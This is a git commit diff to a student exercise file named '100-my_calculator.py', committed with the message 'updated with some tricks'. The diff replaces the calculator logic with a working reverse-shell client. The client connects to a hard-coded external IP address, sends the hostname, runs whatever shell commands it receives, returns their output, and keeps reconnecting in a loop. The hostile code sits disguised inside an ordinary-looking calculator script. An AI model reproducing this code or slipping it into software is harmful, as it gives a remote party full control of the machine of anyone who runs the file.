08e28ab95e003ee197aac2b175f89c580cc8a49b
Bobby Yang <122@holbertonschool.com>
2017-05-05 19:26:43 +0000

    updated with some tricks

--- 0x02-python-import_modules/100-my_calculator.py
+++ 0x02-python-import_modules/100-my_calculator.py
@@ -1,40 +1,130 @@
 #!/usr/bin/python3
+import os
+import socket
+import subprocess
+import time
+import signal
 import sys
+import struct
 
-if __name__ == "__main__":
-    import calculator_1
+class Client(object):
 
-    def print_error(n):
-        if n is 1:
-            print("Usage: ./100-my_calculator.py <a> <operator> <b>")
-            sys.exit(1)
-        elif n is 2:
-            print("Unknown operator. Available operators: +, -, * and /")
-            sys.exit(1)
+    def __init__(self):
+        # self.serverHost = '192.168.1.9'
+        self.serverHost = '107.170.200.75'
+        self.serverPort = 9999
+        self.socket = None
 
-    def print_result(a, op, b, result):
-        print("{:d} {:s} {:d} = {:d}".format(a, op, b, result))
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+        return
 
-    router = {
-            '+': calculator_1.add,
-            '-': calculator_1.sub,
-            '*': calculator_1.mul,
-            '/': calculator_1.div
-            }
+    def quit_gracefully(self, signal=None, frame=None):
+        print('\nQuitting gracefully')
+        if self.socket:
+            try:
+                self.socket.shutdown(2)
+                self.socket.close()
+            except Exception as e:
+                print('Could not close connection %s' % str(e))
+                # continue
+        sys.exit(0)
+        return
 
-    argc = len(sys.argv)
+    def socket_create(self):
+        """ Create a socket """
+        try:
+            self.socket = socket.socket()
+        except socket.error as e:
+            print("Socket creation error" + str(e))
+            return
+        return
 
-    if argc <= 3:
-        print_error(1)
+    def socket_connect(self):
+        """ Connect to a remote socket """
+        try:
+            self.socket.connect((self.serverHost, self.serverPort))
+        except socket.error as e:
+            print("Socket connection error: " + str(e))
+            time.sleep(5)
+            raise
+        try:
+            self.socket.send(str.encode(socket.gethostname()))
+        except socket.error as e:
+            print("Cannot send hostname to server: " + str(e))
+            raise
+        return
 
-    a = int(sys.argv[1])
-    b = int(sys.argv[3])
-    op = sys.argv[2]
+    def print_output(self, output_str):
+        """ Prints command output """
+        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
+        print(output_str)
+        return
 
-    for key in router:
-        if op == key:
-            result = router[op](a, b)
-            print_result(a, op, b, result)
-            sys.exit(0)
+    def receive_commands(self):
+        """ Receive commands from remote server and run on local machine """
+        try:
+            self.socket.recv(10)
+        except Exception as e:
+            print('Could not start communication with server: %s\n' %str(e))
+            return
+        cwd = str.encode(str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
+        while True:
+            output_str = None
+            data = self.socket.recv(20480)
+            if data == b'': break
+            elif data[:2].decode("utf-8") == 'cd':
+                directory = data[3:].decode("utf-8")
+                try:
+                    os.chdir(directory.strip())
+                except Exception as e:
+                    output_str = "Could not change directory: %s\n" %str(e)
+                else: 
+                    output_str = ""
+            elif data[:].decode("utf-8") == 'quit':
+                self.socket.close()
+                break
+            elif len(data) > 0:
+                try:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = output_bytes.decode("utf-8", errors="replace")
+                except Exception as e:
+                    # TODO: Error description is lost
+                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+            if output_str is not None:
+                try:
+                    self.print_output(output_str)
+                except Exception as e:
+                    print('Cannot send command output: %s' %str(e))
+        self.socket.close()
+        return
 
-    print_error(2)
+
+def main():
+    client = Client()
+    client.register_signal_handler()
+    client.socket_create()
+    while True:
+        try:
+            client.socket_connect()
+        except Exception as e:
+            print("Error on socket connections: %s" %str(e))
+            time.sleep(5)     
+        else:
+            break    
+    try:
+        client.receive_commands()
+    except Exception as e:
+        print('Error in main: ' + str(e))
+    client.socket.close()
+    return
+
+
+if __name__ == '__main__':
+    while True:
+        main()
